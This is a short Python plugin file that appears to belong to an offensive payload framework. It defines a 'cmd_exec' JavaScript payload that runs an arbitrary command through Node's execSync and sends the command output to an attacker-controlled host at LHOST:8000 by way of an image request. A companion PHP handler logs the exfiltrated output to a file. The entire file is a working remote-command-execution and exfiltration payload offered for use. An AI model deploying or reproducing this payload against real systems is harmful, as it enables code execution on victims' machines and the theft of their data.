#!/usr/bin/python3.7
import socket
def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except:
        return "N/A"
name="cmd_exec"
description="Executes command using NodeJS's execSync function"
options = [["LHOST", "Host with listening handler", local_ip()],
           ["CMD", "Command to execute", "ls"]] 
handler_options = [["LOGFILE", "File to store logged data", "cmd_output.txt"]]
payload = """

const execSync = require('child_process').execSync;
const output = execSync('CMD', { encoding: 'utf-8' }); 
const executed_command = 'CMD';
new Image().src = "http://LHOST:8000/handler.php?output="+output+"?executed_command="+executed_command;
"""

handler = """
<?php
    $f=fopen("LOGFILE","a+");
    fwrite($f, sprintf("\n[*] Command: %s\n[*] Output: %s", $_GET['executed_command'], $_GET['output']);
    fclose($f);
?>
"""
